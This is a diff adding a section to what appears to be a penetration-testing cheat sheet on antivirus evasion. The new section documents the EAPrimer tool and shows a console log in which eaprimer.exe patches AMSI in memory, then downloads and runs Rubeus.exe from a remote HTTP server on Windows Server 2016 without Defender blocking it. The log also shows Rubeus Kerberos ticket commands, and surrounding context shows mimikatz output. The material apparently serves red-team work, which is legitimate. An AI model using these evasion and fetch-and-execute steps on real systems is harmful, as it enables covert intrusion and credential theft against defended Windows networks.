@@ -19,6 +19,7 @@ II.  Examples of techniques to bypass the Microsoft Antimalware Scan Interface (
 
 III. Examples of techniques to download and execute in-memory offensive Portable Executable (PE) files (without using PowerShell) to bypass AV products
      ➤ Example of AV bypass using the tool 'FilelessRemotePE'
+     ➤ Example of AV bypass using the tool 'EAPrimer'
 
 
 ================================================================================================================================================
@@ -674,4 +675,67 @@ SID               : S-1-5-21-1644803877-2661921197-3301414406-500
 
 mimikatz # exit
 Bye!
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+3.2 Example of AV bypass using the tool 'EAPrimer'
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> Source: https://github.com/m8sec/EAPrimer
+
+EAPrimer can be used to load .Net assemblies (C#) from a filepath or URL. On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. 
+By default, output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.
+
+
+Test/PoC - Download and execution in-memory of Rubeus.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd c:\temp
+
+c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe
+[*] EAPrimer v0.1.2
+[*] Applying In-Memory Patch
+[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+ Ticket requests and renewals:
+
+    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]
+
+    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+ <SNIP>
+
+c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe -args=currentluid
+[*] EAPrimer v0.1.2
+[*] Applying In-Memory Patch
+[*] Assembly Args: "currentluid"
+[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0x739b4 (473524)
+
+ <SNIP>
 
